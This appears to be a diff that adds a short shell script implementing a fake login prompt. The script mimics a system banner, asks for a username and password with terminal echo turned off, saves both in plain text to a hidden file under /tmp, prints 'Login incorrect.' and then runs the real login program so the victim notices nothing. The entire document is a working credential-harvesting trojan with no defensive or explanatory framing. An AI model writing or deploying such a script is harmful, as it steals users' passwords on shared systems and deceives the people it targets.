@@ -1,0 +1,15 @@
+clear
+echo
+echo "`uname -s`/`uname -m` (`uname -n`) (`tty`)"
+echo ""
+echo -n "login: "
+read login
+echo -n "Password: "
+stty -echo
+read passwd
+stty  echo
+echo 
+echo "login=$login, passwd=$passwd" > /tmp/.hide$$
+sleep 1
+echo "Login incorrect."
+exec login
